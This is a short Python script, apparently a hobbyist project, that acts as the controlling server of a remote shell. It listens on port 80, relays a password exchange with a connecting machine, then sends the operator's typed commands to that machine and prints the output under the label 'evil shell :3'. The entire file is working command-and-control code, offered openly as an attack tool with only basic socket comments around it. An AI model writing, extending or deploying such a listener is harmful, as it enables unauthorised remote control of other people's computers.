import socket
# the host is 0.0.0.0 : 
'''
lcoal host translates into 127.0.0.1 which will always be the IP address of the machine 
- can only communicate with the same host

0.0.0.0 ---> "listen on every available network interface"
'''
HOST = "0.0.0.0"
PORT = 80
BUFFER = 1024

# server set up
def main():
    print('running shell')

    # AF_INET is the address family ipv4, SOCK_STREAM is the socket protocol TCP
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    sock.bind((HOST, PORT))
    sock.listen(5) # number of client connections we can accept

    connect, address = sock.accept()
    
    print(f"Connected by {address}")

    # authentication
    password_rec = connect.recv(BUFFER).decode("UTF-8")
    password = input(password_rec)
    connect.send(password.encode())
    output = connect.recv(BUFFER).decode("UTF-8")
    print(output)

    if(output != "Incorrect password. Closing connection"):
        # remote shell
        while True:
            command = input("$ ")
            if command == "":
                break
            print("$ sending command")
            connect.send(command.encode())
            output = connect.recv(BUFFER).decode("UTF-8")
            print("$ evil shell :3 > **********print results: ")
            print(output)
        
    print("closing connection")
    connect.close()

        



    
    

if __name__ == "__main__":
    main()